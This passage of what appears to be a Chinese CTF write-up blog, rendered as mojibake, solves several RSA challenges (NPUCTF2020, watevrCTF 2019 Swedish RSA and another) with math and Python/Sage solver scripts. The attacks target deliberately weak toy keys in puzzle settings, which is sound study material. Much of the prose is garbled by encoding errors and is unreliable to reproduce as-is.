1234hint=int(binascii.hexlify(hint),16)assert(q1p*q1q==n)assert(q1p&lt;q1q)assert(c==pow(hint,e,n)) åœ¨çº¿åˆ†è§£nå¾—åˆ°q1pä¸q1q å‰©ä¸‹çš„å°±æ˜¯åŸºæ“ CRT 12assert(c1==pow(flag,e1,p*q1))assert(c2==pow(flag,e2,p*q2)) è¿™é‡Œæœ‰ phi1=(pâˆ’1)âˆ—(q1âˆ’1)phi1 = (p - 1)*(q_{1} - 1)phi1=(pâˆ’1)âˆ—(q1â€‹âˆ’1) phi2=(pâˆ’1)âˆ—(q2âˆ’1)phi2 = (p - 1)*(q_{2} - 1)phi2=(pâˆ’1)âˆ—(q2â€‹âˆ’1) è€Œåœ¨æ±‚dæ—¶ï¼Œe1åœ¨æ¨¡phi1æ—¶ä¸å­˜åœ¨é€†å…ƒï¼Œe2åœ¨æ¨¡phi2æ—¶ä¸å­˜åœ¨é€†å…ƒ å³eï¼Œphiä¸äº’ç´  è¿™é‡Œéœ€è¦è¿›è¡Œæ¨ç®— e=aâˆ—be = a * be=aâˆ—b b=gcd(e,phi)b = gcd(e, phi)b=gcd(e,phi) a=e//ba = e // ba=e//b eâˆ—dâ‰¡1mod phie * d â‰¡ 1 \\mod phieâˆ—dâ‰¡1modphi aâˆ—bâˆ—dâ‰¡1mod phia * b * d â‰¡ 1 \\mod phiaâˆ—bâˆ—dâ‰¡1modphi bd=invert(a,phi)bd = invert(a, phi)bd=invert(a,phi) câ‰¡meâ‰¡mabmod nc â‰¡ m^{e} â‰¡ m^{ab} \\mod ncâ‰¡meâ‰¡mabmodn cbdâ‰¡(mab)bdâ‰¡mabbdâ‰¡mbmod bc^{bd} â‰¡ (m^{ab})^{bd} â‰¡ m^{abbd} â‰¡ m^b \\mod bcbdâ‰¡(mab)bdâ‰¡mabbdâ‰¡mbmodb è¿™é‡Œè®¡ç®—å¾—å‡º b1 = b2 = 14 æ€è·¯æ‰©å±•ï¼š è‹¥bä¸º2åˆ™å¯ä»¥ä½¿ç”¨Rabin Attack è‹¥bä¸ºç‰¹åˆ«å°çš„å€¼åˆ™å¯ä»¥ä½¿ç”¨ä½æŒ‡æ•°çš„åŠæ³•è¿›è¡Œçˆ†ç ´ ä½†æ˜¯14æ¬¡æ–¹å¯¹äºçˆ†ç ´æ¥è¯´è¿‡äºå›°éš¾ï¼Œéœ€è¦ç»“åˆä¸¤ä¸ªå¼å­è¿›è¡ŒCRT {c1=m14mod pâˆ—q1c2=m14mod pâˆ—q2\\begin{cases} c_{1} = m^{14} \\mod p*q_{1} \\\\ c_{2} = m^{14} \\mod p*q_{2} \\end{cases} {c1â€‹=m14modpâˆ—q1â€‹c2â€‹=m14modpâˆ—q2â€‹â€‹ é‚£ä¹ˆå¯ä»¥å¯¹å¼å­è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†è§£ {c1=m14mod pc2=m14mod q1c3=m14mod q2\\begin{cases} c_{1} = m^{14} \\mod p \\\\ c_{2} = m^{14} \\mod q_{1} \\\\ c_{3} = m^{14} \\mod q_{2} \\end{cases} â©âªâ¨âªâ§â€‹c1â€‹=m14modpc2â€‹=m14modq1â€‹c3â€‹=m14modq2â€‹â€‹ ä½¿ç”¨CRTå¯ä»¥å¾—åˆ° pâˆ—q1âˆ—q2p*q_{1}*q_{2}pâˆ—q1â€‹âˆ—q2â€‹ èŒƒå›´å†… m14m^{14}m14 çš„ç‰¹è§£ m1m_{1}m1â€‹ m2â‰¡m1mod q1âˆ—q2m_{2} â‰¡ m_{1} \\mod q_{1}*q_{2}m2â€‹â‰¡m1â€‹modq1â€‹âˆ—q2â€‹ å³ m2â‰¡m14mod q1âˆ—q2m_{2} â‰¡ m^{14} \\mod q_{1}*q_{2}m2â€‹â‰¡m14modq1â€‹âˆ—q2â€‹ gcd(14,(q1âˆ’1)âˆ—(q2âˆ’1))=2gcd(14, (q_{1} - 1)*(q_{2} - 1)) = 2gcd(14,(q1â€‹âˆ’1)âˆ—(q2â€‹âˆ’1))=2 é‚£ä¹ˆå¯ä»¥å†ä¸€æ¬¡å¯¹å¼å­è¿›è¡Œå˜æ¢ câ‰¡m2mod nc â‰¡ m^{2} \\mod ncâ‰¡m2modn è¿™é‡Œcçš„ä½æ•°ä¸º702ï¼Œè€Œnçš„ä½æ•°ä¸º2047ï¼Œç›´æ¥å¼€æ–¹å³å¯å¾—åˆ°flag Code 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import binasciiimport gmpy2 n = [20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423, 31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421, 29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303, 25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791]c = [19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569, 15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031, 18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446, 2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797]#ä½æŒ‡æ•°å¹¿æ’­k0 = gmpy2.invert(n[1]*n[2], n[0])k1 = gmpy2.invert(n[0]*n[2], n[1])k2 = gmpy2.invert(n[0]*n[1], n[2])p = gmpy2.iroot((n[1]*n[2]*k0*c[0] + n[0]*n[2]*k1*c[1] + n[0]*n[1]*k2*c[2])%(n[0]*n[1]*n[2]),4)[0]ee1 = 42ee2 = 3ce1 = 45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384ce2 = 13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158tmp = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387n = 15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039#ä½æŒ‡æ•°for i in range(0,10000000): k = gmpy2.iroot(i*n+ce1, ee1) if k[1] == True: e1 = k[0] break for i in range(0,100000): k = gmpy2.iroot(i*n+ce2, ee2) if k[1] == True: e2tmp = k[0] e2 = e2tmp - tmp break e = 46531n = 16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603c = 14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469q1p = 127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871q1q = 127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088835693#åˆ†è§£nphi = (q1p - 1)*(q1q - 1)d = gmpy2.invert(e, phi)hint = binascii.unhexlify(hex(pow(c, d, n))[2:].encode())print(hint) q1=q1pq2 = 114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513c1 = 262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124c2 = 7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596#CRTphi1 = (p - 1)*(q1 - 1)b1 = gmpy2.gcd(e1, phi1)a1 = e1 // b1bd1 = gmpy2.invert(a1, phi1)flagb1 = pow(c1, bd1, p*q1) phi2 = (p - 1)*(q2 - 1)b2 = gmpy2.gcd(e2, phi2)a2 = e2 // b2bd2 = gmpy2.invert(a2, phi2)flagb2 = pow(c2, bd2, p*q2) n01 = pn02 = q1n03 = q2c01 = flagb1 % n01c02 = flagb1 % n02c03 = flagb2 % n03k01 = gmpy2.invert(n02*n03, n01)k02 = gmpy2.invert(n01*n03, n02)k03 = gmpy2.invert(n01*n02, n03)n3 = q1 * q2flag14 = (n02*n03*k01*c01 + n01*n03*k02*c02 + n01*n02*k03*c03)%(n01*n02*n03)%n3phi3 = (q1 - 1)*(q2 - 1)e3 = b1b3 = gmpy2.gcd(e3, phi3)a3 = e3 // b3bd3 = gmpy2.invert(a3, phi3)flag2 = pow(flag14, bd3, n3)flag = gmpy2.iroot(flag2, 2)[0]print(binascii.unhexlify(hex(flag)[2:].encode())) [NPUCTF2020]è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒ 12345678910111213141516171819202122from Crypto.Util.number import *from gmpy2 import *from secret import flagp = getPrime(25)e = # Hiddenq = getPrime(25)n = p * qm = bytes_to_long(flag.strip(b&quot;npuctf&#123;&quot;).strip(b&quot;&#125;&quot;))c = pow(m, e, n)print(c)print(pow(2, e, n))print(pow(4, e, n))print(pow(8, e, n))&#x27;&#x27;&#x27;169169912654178128509160179202518818742414340358553002064450&#x27;&#x27;&#x27; ç®—å¼æ¨å¯¼ {c1â‰¡2emod nc2â‰¡4emod nc3â‰¡8emod n\\begin{cases} c_{1} â‰¡ 2^{e} \\mod n \\\\ c_{2} â‰¡ 4^{e} \\mod n \\\\ c_{3} â‰¡ 8^{e} \\mod n \\end{cases} â©âªâ¨âªâ§â€‹c1â€‹â‰¡2emodnc2â€‹â‰¡4emodnc3â€‹â‰¡8emodnâ€‹ c12â‰¡(2e)2â‰¡4eâ‰¡c2mod nc_{1}^{2} â‰¡ (2^{e})^{2} â‰¡ 4^{e} â‰¡ c_{2} \\mod nc12â€‹â‰¡(2e)2â‰¡4eâ‰¡c2â€‹modn c12âˆ’c2â‰¡0mod nc_{1}^{2} - c_{2} â‰¡ 0 \\mod nc12â€‹âˆ’c2â€‹â‰¡0modn c12âˆ’c2=k1âˆ—nc_{1}^{2} - c_{2} = k_{1}*nc12â€‹âˆ’c2â€‹=k1â€‹âˆ—n c13â‰¡(2e)3â‰¡8eâ‰¡c3mod nc_{1}^{3} â‰¡ (2^{e})^{3} â‰¡ 8^{e} â‰¡ c_{3} \\mod nc13â€‹â‰¡(2e)3â‰¡8eâ‰¡c3â€‹modn c13âˆ’c3â‰¡0mod nc_{1}^{3} - c_{3} â‰¡ 0 \\mod nc13â€‹âˆ’c3â€‹â‰¡0modn c12âˆ’c2=k2âˆ—nc_{1}^{2} - c_{2} = k_{2}*nc12â€‹âˆ’c2â€‹=k2â€‹âˆ—n gcd(k1âˆ—n,k2âˆ—n)=gcd(k1,k2)âˆ—ngcd(k_{1}*n, k_{2}*n) = gcd(k_{1}, k_{2})*ngcd(k1â€‹âˆ—n,k2â€‹âˆ—n)=gcd(k1â€‹,k2â€‹)âˆ—n Discrete Log 12345F = IntegerModRing(n)e = bsgs(F(2), F(c1), (0, 2**32))#########import sympysympy.discrete_log(n, c1, 2) Code 12345678910111213141516171819c = 169169912654178c1 = 128509160179202c2 = 518818742414340c3 = 358553002064450import gmpy2import sympyfrom Crypto.Util.number import *n1 = gmpy2.gcd(c1*c1 - c2,c1**3 - c3)n = n1 // 2p = 18195301q = 28977097F = IntegerModRing(n)e = bsgs(F(2), F(c1), (0, 2**32))#e = sympy.discrete_log(n, c1, 2)phi = (p - 1)*(q - 1)d = gmpy2.invert(e, phi)flag = pow(c, d, n)print(long_to_bytes(flag)) [watevrCTF 2019]Swedish RSA 12345678910111213141516171819202122232425262728293031323334353637383940414243444546flag = bytearray(raw_input())flag = list(flag)length = len(flag)bits = 16## Prime for Finite Field.p = random_prime(2^bits-1, False, 2^(bits-1))file_out = open(&quot;downloads/polynomial_rsa.txt&quot;, &quot;w&quot;)file_out.write(&quot;Prime: &quot; + str(p) + &quot;\\n&quot;)## Univariate Polynomial Ring in y over Finite Field of size pR.&lt;y&gt; = PolynomialRing(GF(p))## Analogous to the primes in Zdef gen_irreducable_poly(deg): while True: out = R.random_element(degree=deg) if out.is_irreducible(): return out## Polynomial &quot;primes&quot;P = gen_irreducable_poly(ZZ.random_element(length, 2*length))Q = gen_irreducable_poly(ZZ.random_element(length, 2*length))## Public exponent keye = 65537## ModulusN = P*Qfile_out.write(&quot;Modulus: &quot; + str(N) + &quot;\\n&quot;)## Univariate Quotient Polynomial Ring in x over Finite Field of size 659 with modulus N(x)S.&lt;x&gt; = R.quotient(N)## Encryptm = S(flag)c = m^efile_out.write(&quot;Ciphertext: &quot; + str(c))file_out.close()############Prime: 43753Modulus: 34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814Ciphertext: 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659 å¤šé¡¹å¼ç¯ ç¬¬ä¸€æ¬¡è§åˆ°RSAä¸å¤šé¡¹å¼ç¯ç»“åˆçš„é¢˜ ä½¿ç”¨sageåˆ†è§£nå¾—åˆ°ä¸¤ä¸ªå¤šé¡¹å¼ï¼Œåˆ†åˆ«ä¸ºpå’Œq 1(34036) * (y^65 + 39688*y^64 + 22199*y^63 + 41942*y^62 + 7803*y^61 + 19710*y^60 + 14794*y^59 + 41388*y^58 + 2418*y^57 + 19208*y^56 + 39941*y^55 + 36392*y^54 + 19813*y^53 + 33864*y^52 + 29099*y^51 + 15484*y^50 + 27185*y^49 + 27721*y^48 + 31508*y^47 + 19404*y^46 + 10134*y^45 + 43481*y^44 + 3899*y^43 + 32849*y^42 + 3534*y^41 + 32086*y^40 + 14221*y^39 + 42982*y^38 + 1403*y^37 + 1619*y^36 + 36054*y^35 + 33615*y^34 + 6628*y^33 + 31709*y^32 + 6968*y^31 + 28517*y^30 + 12938*y^29 + 21124*y^28 + 10400*y^27 + 28889*y^26 + 7273*y^25 + 36442*y^24 + 14935*y^23 + 29365*y^22 + 4869*y^21 + 43562*y^20 + 6435*y^19 + 4403*y^18 + 32311*y^17 + 7575*y^16 + 28199*y^15 + 28065*y^14 + 23870*y^13 + 37314*y^12 + 15299*y^11 + 7082*y^10 + 36230*y^9 + 18367*y^8 + 12531*y^7 + 25906*y^6 + 26878*y^5 + 43073*y^4 + 11582*y^3 + 4482*y^2 + 35044*y + 31388) * (y^112 + 31097*y^111 + 15815*y^110 + 17170*y^109 + 43684*y^108 + 16873*y^107 + 17269*y^106 + 10853*y^105 + 10690*y^104 + 24864*y^103 + 10224*y^102 + 28704*y^101 + 16049*y^100 + 1154*y^99 + 40034*y^98 + 29922*y^97 + 27404*y^96 + 32514*y^95 + 40962*y^94 + 32858*y^93 + 36590*y^92 + 41302*y^91 + 20803*y^90 + 43521*y^89 + 13746*y^88 + 19857*y^87 + 21539*y^86 + 36888*y^85 + 16032*y^84 + 35825*y^83 + 24705*y^82 + 31143*y^81 + 22088*y^80 + 6686*y^79 + 37947*y^78 + 5661*y^77 + 29405*y^76 + 36071*y^75 + 35492*y^74 + 28985*y^73 + 36015*y^72 + 24095*y^71 + 34920*y^70 + 6615*y^69 + 9606*y^68 + 4255*y^67 + 22981*y^66 + 3910*y^65 + 23897*y^64 + 22711*y^63 + 23350*y^62 + 7969*y^61 + 8558*y^60 + 8001*y^59 + 8431*y^58 + 3314*y^57 + 23364*y^56 + 39391*y^55 + 32722*y^54 + 2543*y^53 + 22196*y^52 + 24189*y^51 + 19420*y^50 + 10649*y^49 + 19070*y^48 + 23863*y^47 + 19597*y^46 + 39699*y^45 + 7620*y^44 + 25067*y^43 + 29912*y^42 + 14998*y^41 + 14492*y^40 + 31322*y^39 + 43145*y^38 + 32006*y^37 + 38976*y^36 + 32534*y^35 + 6972*y^34 + 37351*y^33 + 30104*y^32 + 6032*y^31 + 33729*y^30 + 27110*y^29 + 5268*y^28 + 2974*y^27 + 2985*y^26 + 31610*y^25 + 28364*y^24 + 34924*y^23 + 17414*y^22 + 28813*y^21 + 43680*y^20 + 32175*y^19 + 18248*y^18 + 25171*y^17 + 31185*y^16 + 30125*y^15 + 36836*y^14 + 7218*y^13 + 11292*y^12 + 31123*y^11 + 40360*y^10 + 34093*y^9 + 39606*y^8 + 2788*y^7 + 27277*y^6 + 21835*y^5 + 1331*y^4 + 32614*y^3 + 25020*y^2 + 20981*y + 12108) æ¬§æ‹‰å‡½æ•° å¦‚æœå¯¹å¤šé¡¹å¼ç¯ä¸æ¸…æ¥šçš„è¯ï¼Œå¯èƒ½å°±ç›´æ¥è®¡ç®— phi=(pâˆ’1)âˆ—(qâˆ’1)phi=(p - 1)*(q - 1)phi=(pâˆ’1)âˆ—(qâˆ’1) è¿™é‡Œéœ€è¦æä¸€ä¸‹æ¬§æ‹‰å‡½æ•°çš„å®šä¹‰ phi(n)phi(n)phi(n)ï¼šå°äºæˆ–ç­‰äºnçš„æ­£æ•´æ•°ä¸­ä¸näº’è´¨çš„æ•°çš„æ•°ç›® é‚£ä¹ˆè¿™é‡Œè¿ç”¨æ¬§æ‹‰å‡½æ•°çš„æ€§è´¨ä¹‹ä¸€ï¼šphi(aâˆ—b)=phi(a)âˆ—phi(b)phi(a*b)=phi(a)*phi(b)phi(aâˆ—b)=phi(a)âˆ—phi(b) å°† phi(n)phi(n)phi(n) çš„é—®é¢˜è½¬æ¢åˆ° phi(p)phi(p)phi(p) å’Œ phi(q)phi(q)phi(q) ä¸Š åœ¨å¤šé¡¹å¼çš„æƒ…å†µä¸‹ï¼Œ phi(p)phi(p)phi(p) è¡¨ç¤ºä¸é«˜äºp(x)å¹‚çº§çš„ç¯å†…æ‰€æœ‰å¤šé¡¹å¼ä¸­ï¼Œä¸p(x)æ— å…¬å› å¼çš„å…¶ä»–å¤šé¡¹å¼çš„ä¸ªæ•° è¿™é‡Œpä¸ºä¸å¯çº¦å¤šé¡¹å¼ï¼ˆè§ä»£ç ï¼‰ï¼Œç›¸å½“äºå¤šé¡¹å¼ç¯ä¸­çš„&quot;ç´ æ•°&quot;ã€‚æ‰€ä»¥æ¯ä¸€ä¸ªä¸é«˜äºp(x)å¹‚çº§çš„ç¯å†…å¤šé¡¹å¼å‡æ»¡è¶³æ¬§æ‹‰å‡½æ•°çš„æ¡ä»¶ æœ‰é™åŸŸçš„å¤§å°ä¸º43753ï¼Œå¤šé¡¹å¼pçš„æœ€é«˜æ¬¡å¹‚ä¸º65ï¼Œåˆ™ phi(p)=(4375365âˆ’1)phi(p) = (43753^{65} - 1)phi(p)=(4375365âˆ’1) åŒç† phi(q)=(43753112âˆ’1)phi(q) = (43753^{112} - 1)phi(q)=(43753112âˆ’1) phi(n)=phi(p)âˆ—phi(q)=(4375365âˆ’1)âˆ—(43753112âˆ’1)phi(n) = phi(p)*phi(q) = (43753^{65} - 1)*(43753^{112} - 1)phi(n)=phi(p)âˆ—phi(q)=(4375365âˆ’1)âˆ—(43753112âˆ’1) 